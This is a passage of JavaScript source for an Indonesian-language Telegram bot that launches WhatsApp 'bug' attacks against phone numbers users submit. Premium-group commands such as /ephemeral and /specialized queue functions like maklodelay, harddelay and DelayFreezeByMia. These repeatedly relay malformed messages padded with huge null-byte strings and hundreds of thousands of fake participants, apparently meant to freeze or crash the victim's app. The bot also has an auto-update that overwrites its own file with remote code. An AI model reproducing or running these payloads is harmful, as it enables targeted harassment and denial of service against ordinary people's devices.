  if (cmd === 'grouponly' && !isOwner) {
    return ctx.reply('❌ Hanya Owner yang bisa mengakses cmd')
  }

  return next()
})

let forceChannel = null
let channelOn = false

// =================
// Helper
// =================
function isOwner(ctx) {
  return ID_TELEGRAM || isAdmin(userId);
}

// =================
// Middleware (AUTO CEK JOIN)
// =================
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  // Skip kalau belum aktif / belum set channel
  if (!channelOn || !forceChannel) return next()

  try {
    const member = await ctx.telegram.getChatMember(forceChannel, ctx.from.id)

    const status = member.status
    if (status === 'left' || status === 'kicked') {
      return ctx.reply(
        `❌ Anda harus join channel dulu!\n\n👉 ${forceChannel}`
      )
    }

  } catch (e) {
    return ctx.reply('⚠️ Bot tidak bisa cek channel (pastikan bot admin)')
  }

  return next()
})

// =================
//---------(HANDLER BLOCK CMD ) ---------//
// =================
const BLOCKCMD_FILE = path.join(__dirname, "blocked_commands.json");

let blockedCommands = [];

function loadBlockedCommands() {
  try {
    if (fs.existsSync(BLOCKCMD_FILE)) {
      const raw = fs.readFileSync(BLOCKCMD_FILE, "utf8");
      const parsed = JSON.parse(raw);

      if (Array.isArray(parsed)) {
        blockedCommands = parsed.map(cmd => String(cmd).toLowerCase().trim());
      } else {
        blockedCommands = [];
      }
    } else {
      blockedCommands = [];
    }
  } catch (err) {
    console.error("Gagal load blocked commands:", err.message);
    blockedCommands = [];
  }
}

function saveBlockedCommands() {
  try {
    fs.writeFileSync(BLOCKCMD_FILE, JSON.stringify(blockedCommands, null, 2));
  } catch (err) {
    console.error("Gagal save blocked commands:", err.message);
  }
}

function normalizeCommandName(input) {
  return String(input || "")
    .trim()
    .toLowerCase()
    .replace(/^\//, "");
}

function isCommandBlocked(commandName) {
  const normalized = normalizeCommandName(commandName);
  return blockedCommands.includes(normalized);
}

loadBlockedCommands();

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};


//---------(MIDDLEWARE BLOCK CMD ) ---------//

bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) {
    return next();
  }

  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) {
    return next();
  }

  const command = normalizeCommandName(text.split(" ")[0].split("@")[0]);

  // command manajemen block jangan ikut diblok oleh middleware ini
  const bypassCommands = ["blockcmd", "unblockcmd", "listblockcmd"];

  if (!bypassCommands.includes(command) && isCommandBlocked(command)) {
    await ctx.reply(`❌ Command /${command} sedang diblokir.`);
    return;
  }

  return next();
});

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

function saveCooldown(data) {
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
}

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;

  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Khusus owner.", {
      reply_to_message_id: ctx.message?.message_id
    });
  }

  return next();
};

// ------ ( Menu Utama + Button Disko ) ------ //
const styles = ["Primary", "Success", "Danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedMainKeyboard() {
    const style = styles[styleIndex];

    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    return [
        [
            { text: "𝗫𝗕𝗨𝗚𝗦", callback_data:
 "/bug_menu", style },
            { text: "𝗢𝗪𝗡𝗘𝗥" , 
url: "t.me/KuzooX", style },
            { text: "𝗫𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦" ,
callback_data: "/owner_menu", style }
        ]
    ];
}

function stopMenuAnimation() {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
}

// ------ ( Menu Utama ) ------ //
bot.start(async (ctx) => {
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const runTime = runtime(process.uptime());
    const menuMessage = `\`\`\`JS
ⓘ 𝘴ꫀꪀꫀ𝘳𝓲𝓽ꪗ ꪀ𝓲ᧁꫝ𝓽
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
I  N  F  O  R  M  A  T  I  O  N 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Owner : @KuzooX
System : Auto-Update 
Access : Premium Verified
Premium : ONLINE
User : @${ctx.from.username || "Tidak Ada"}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  N  I G H T M  A  R E
     V  E R S I O N
━━━━━━━━━━━━━━━━━━━━━━━━━━

Tap button below to continue...

\`\`\``;

    try {
        stopMenuAnimation();

        const sentMsg = await ctx.replyWithPhoto(FotoUtama, {
            caption: menuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: getAnimatedMainKeyboard()
            }
        });

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    sentMsg.message_id,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);
    } catch (error) {
        console.error("Error saat mengirim menu utama:", error);
    }
});

// ------ ( Callback Menu Utama ) ------ //
bot.action("/start", async (ctx) => {
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const runTime = runtime(process.uptime());
    const menuMessage = `\`\`\`JS
ⓘ 𝘴ꫀꪀꫀ𝘳𝓲𝓽ꪗ ꪀ𝓲ᧁꫝ𝓽
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
I  N  F  O  R  M  A  T  I  O  N 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Owner : @KuzooX
System : Auto-Update 
Access : Premium Verified
Premium : ONLINE
User : @${ctx.from.username || "Tidak Ada"}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  N  I G H T M  A  R E
     V  E R S I O N
━━━━━━━━━━━━━━━━━━━━━━━━━━

Tap button below to continue

\`\`\``;

    try {
        stopMenuAnimation();

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: FotoUtama,
                caption: menuMessage,
                parse_mode: "Markdown"
            },
            {
                reply_markup: {
                    inline_keyboard: getAnimatedMainKeyboard()
                }
            }
        );

        const messageId = ctx.callbackQuery.message.message_id;

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);

        await ctx.answerCbQuery();
    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Bug Menu ) ------ //
bot.action('/bug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const bug_menuMenu = `\`\`\`JS
━━━━━━━━━━━━━━━━━━━━    
I N V I S I B L E   B U G S
━━━━━━━━━━━━━━━━━━━━
/specialized - Delay Hard Extreme
/ephemeral - Delay Hard murbug
/interactive - Delay For Murbug 
\`\`\``;

    const keyboard = [
        [
            { text: "⟲", callback_data: "/start", style: "Danger" },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Owner Menu ) ------ //
bot.action('/owner_menu', async (ctx) => {
    stopMenuAnimation(); 
    const owner_menuMenu = `\`\`\`JS

OWNER COMMAND
↯ /addbot - Add Sender 
↯ /killsesi - Hapus Sender
↯ /pullupdate - Update File New
↯ /blockcmd - Blokir Command
↯ /unblockcmd - Buka command 
↯ /listblockcmd - List blokir command
↯ /setchannel - Untuk Setting Join Channel
↯ /channel - Untuk Setting setchannel on/off

USER MANAGEMENT 
↯ /addprem - Add Premium 
↯ /delprem - Del Premium 
↯ /addadmin - Add Admin
↯ /deladmin - Del Admin

GROUPS MANAGEMENT 
↯ /grouponly - Group Mode
↯ /addpremgrup - Add Group Premium
↯ /delpremgrup - Delete Premium Group 
↯ /cekpremgrup - List Premium Group
↯ /setcd - Mengatur Cooldown 


\`\`\``;

    const keyboard = [
        [
            { text: "⟲", callback_data: "/start", style: "Danger" },
        ]
    ];

    try {
        await ctx.editMessageCaption(owner_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Case Bug Menu ) ------ //

// ------ ( Case Bebas Spam ) ------ //
bot.command("ephemeral", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /ephemeral 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `
✅ ephemeral (bug) Payload Proses untuk ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Hati(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `
✅ ephemeral (bug) Payload Terkirim untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
      ctx.chat.id, `
✅ XForce (bug) Payload gagal untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("interactive", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /interactive 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `
✅ interactive (bug) Payload Proses untuk ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Hati2(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `
✅ interactive (bug) Payload Terkirim untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `
✅ XClown (bug) Payload gagal untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("specialized", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /interactive 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `
✅ specialized (bug) Payload Proses untuk ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Hati3(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `
✅ specialized (bug) Payload Terkirim untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
        ctx.chat.id, `
✅ XClown (bug) Payload gagal untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

bot.command("luminous", premGroupOnly(), async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!isWhatsAppConnected) {
    return ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
  }

  const args = ctx.message.text.split(" ");
  if (!args[1]) {
    return ctx.reply("📌 Format: /luminous 628xxxx", { parse_mode: "HTML" });
  }

  const rawNumber = args[1];
  const target = formatTarget(rawNumber);

  if (!target) {
    return ctx.reply("❌ Nomor tidak valid...", { parse_mode: "HTML" });
  }

  const taskId = Date.now().toString().slice(-6);
  const startAt = Date.now();

  const uname = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fname = [ctx.from.first_name, ctx.from.last_name].filter(Boolean).join(" ") || "-";

  await ctx.telegram.sendMessage(
    ctx.chat.id, `
✅ luminous (bug) Payload Proses untuk ${rawNumber}`,
    {
      parse_mode: "Markdown"
    }
  );

  queue.add(async () => {
    try {
      await Hati4(ctx, target);

      const ms = Date.now() - startAt;
      const sec = Math.floor(ms / 1000);
      const mm = String(Math.floor(sec / 60)).padStart(2, "0");
      const ss = String(sec % 60).padStart(2, "0");

      await ctx.telegram.sendMessage(
        ctx.chat.id, `
✅ luminous (bug) Payload Terkirim untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    } catch (e) {
      await ctx.telegram.sendMessage(
      ctx.chat.id, `
✅ XForce (bug) Payload gagal untuk ${rawNumber}`,
        {
          parse_mode: "Markdown"
        }
      );
    }
  });
});

// ------ ( Awal Of Function Bug) ------ //

async function maklodelay(sock, target) {
const x = "\u0000".repeat(9000);
const ryy = "999999999999";
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
const xryy = {
    groupStatusMessageV2: {
      message: {
        stickerPackMessage: {
          stickerPackId: x,
          name: x,
          publisher: x,
          fileLength: ryy,
          fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
          fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
          mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
          mimetype: "image/webp",
          directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
          contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 899099}@s.whatsapp.net`
            }))
          }
         }
        }
      }
    }
  };
  
  const xryyv2 = {
  groupStatusMessageV2: {
      message: {
      interactiveResponseMessage: {
        body: {
          text: "XRyyModeLawkaNnjr",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "1",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "flow_message",
          paramsJson: "2",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "request_call_message",
          paramsJson: "3",
          version: 3
        },
        nativeFlowResponseMessage: {
          name: "order_message",
          paramsJson: "4",
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
          isForwarded: true,
          forwardingScore: 9999,
          urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
              participant: `62${z + 720599}@s.whatsapp.net`
            }))
            } 
          }
        }
      }
    }
  };

  await sock.relayMessage(target, xryy, {
    participant: { jid: target }
  });
    await sock.relayMessage(target, xryyv2, {
    participant: { jid: target }
  });
} 
} 

async function harddelay(sock, target) {
  console.log("[succes sending delay invisible for target:", target);
  
  const x = "\u0000".repeat(9000);
  const ryy = "999999999999";
  const startTime = Date.now();
  const duration = 1 * 60 * 1000;
  
  console.log("[Starting while loop for 60 seconds...");
  
  while (Date.now() - startTime < duration) {
    const xryy = {
      groupStatusMessageV2: {
        message: {
          stickerPackMessage: {
            stickerPackId: x,
            name: x,
            publisher: x,
            fileLength: ryy,
            fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
            fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
            mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
            mimetype: "image/webp",
            directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            contextInfo: {
              remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
              isForwarded: true,
              forwardingScore: 9999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                  participant: `62${z + 899099}@s.whatsapp.net`
                }))
              },
            },
          }
        }
      }
    };

    try {
      await sock.relayMessage(target, xryy, {
        participant: { jid: target }
      });
      console.log("delay hard message sent successfully to:", target);
    } catch (err) {
      console.error("harddelay failed to send message:", err.message);
    }
  }
  
  console.log("harddelay function completed after 60 seconds for target:", target);
}

async function DelayFreezeByMia(sock, target) {
  for (let i = 0; i < 50; i++) {
    const zephyrineMessages = {
      groupStatusMessageV2: {
        message: {
          albumMessage: {
            expectedImageCount: 100,
            collectionId: "Kuzoo Nih Bosh",
            title: "Kuzoo Nih Bosh" + "\u200e".repeat(50000),
            contextInfo: {
              remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
              isForwarded: true,
              forwardingScore: 9999,
              urlTrackingMap: {
                urlTrackingMapElements: Array.from({ length: 209000 }, (_, z) => ({
                  participant: `62${z + 899099}@s.whatsapp.net`
                }))
              }
            }
          }
        }
      }
    };

    await sock.relayMessage(target, zephyrineMessages, {
      participant: { jid: target }
    });

    const delay = 1000 + Math.floor(i / 5) * 500;
    await new Promise(resolve => setTimeout(resolve, delay));

    if ((i + 1) % 10 === 0) {
      await new Promise(resolve => setTimeout(resolve, 3000));
    }
  }
}

// ------ ( Akhir Of Function Bug) ------ //
bot.command('setchannel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (!arg) {
    return ctx.reply('Format: /setchannel @channel / off')
  }

  if (arg === 'off') {
    forceChannel = null
    return ctx.reply('❌ Channel dihapus')
  }

  forceChannel = arg
  ctx.reply(`✅ Channel diset ke ${arg}`)
})

// =================
// ON / OFF FITUR
// =================
bot.command('channel', (ctx) => {
  if (!isOwner(ctx)) return ctx.reply('❌ Anda bukan owner')

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    if (!forceChannel) {
      return ctx.reply('❌ Set channel dulu pakai /setchannel')
    }

    channelOn = true
    ctx.reply('🔒 Force Join diaktifkan')
  } 
  else if (arg === 'off') {
    channelOn = false
    ctx.reply('🔓 Force Join dimatikan')
  } 
  else {
    ctx.reply('Gunakan: /channel on / off')
  }
})

bot.command('grouponly', (ctx) => {
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (!isOwner) {
    return ctx.reply('❌ Anda bukan owner')
  }

  const arg = ctx.message.text.split(' ')[1]

  if (arg === 'on') {
    groupOnly = true
    ctx.reply('🔒 Group Only diaktifkan (SEMUA private diblok)')
  } else if (arg === 'off') {
    groupOnly = false
    ctx.reply('🔓 Group Only dimatikan')
  } else {
    ctx.reply('Gunakan: /grouponly on / off')
  }
})

bot.command("blockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /blockcmd namacommand");
  }

  if (["blockcmd", "unblockcmd", "listblockcmd"].includes(commandName)) {
    return ctx.reply("❌ Command ini tidak bisa diblokir.");
  }

  if (blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} sudah diblokir.`);
  }

  blockedCommands.push(commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil diblokir.`);
});

bot.command("unblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  const args = ctx.message.text.split(" ").slice(1);
  const commandName = normalizeCommandName(args[0]);

  if (!commandName) {
    return ctx.reply("🪧 Format: /unblockcmd namacommand");
  }

  if (!blockedCommands.includes(commandName)) {
    return ctx.reply(`⚠️ Command /${commandName} tidak sedang diblokir.`);
  }

  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
  saveBlockedCommands();

  return ctx.reply(`✅ Command /${commandName} berhasil dibuka kembali.`);
});

bot.command("listblockcmd", async (ctx) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Akses ditolak.");
  }

  if (blockedCommands.length === 0) {
    return ctx.reply("✅ Tidak ada command yang sedang diblokir.");
  }

  const list = blockedCommands.map((cmd, i) => `${i + 1}. /${cmd}`).join("\n");

  return ctx.reply(
    `📋 Daftar command yang diblokir:\n\n${list}`
  );
});

bot.command("pullupdate", async (ctx) => doUpdate(ctx));

// ✅ UPDATE URL DISINI AJA (GAK DIPISAH)
const UPDATE_URL =
  "https://raw.githubusercontent.com/viezs1479/xixixixiUpdate/refs/heads/main/index.js"; // GANTI RAW URL

// ✅ foto /start
const thumbnailUp = "https://n.uguu.se/RpdhmPFp.jpg"; // GANTI (boleh file_id juga)

// ✅ file yang mau ditimpa update (samain sama file yang dijalanin panel)
const UPDATE_FILE_PATH = "./index.js"; // GANTI kalau panel jalanin file lain

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", {
      parse_mode: "HTML",
    });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

bot.command("addpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  addPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `✅ ☇ <b>${title}</b> berhasil ditambahkan sebagai Group premium`,
    { parse_mode: "HTML" }
  );
});

bot.command("delpremgrup", ownerOnly(), async (ctx) => {
  const type = ctx.chat?.type;
  if (type === "private") return ctx.reply("❌ Pakai command ini di grup.");

  delPremGroup(ctx.chat.id);

  const title = escapeHtml(ctx.chat?.title || "Unknown Group");
  return ctx.reply(
    `🗑 ☇ <b>${title}</b> berhasil dihapus sebagai group premium sampai`,
    { parse_mode: "HTML" }
  );
});

bot.command("cekpremgrup", ownerOnly(), async (ctx) => {
  const db = loadPremGroups();
  if (!db.groups.length) return ctx.reply("📭 Tidak ada grup premium.");

  const lines = db.groups.map((id, i) => `${i + 1}. <code>${id}</code>`).join("\n");
  return ctx.reply(`📌 <b>LIST GRUP PREMIUM</b>\n\n${lines}`, { parse_mode: "HTML" });
});

bot.command("setcd", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcd 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});


// ---- ( akhir of menu ) ---- //
bot.launch();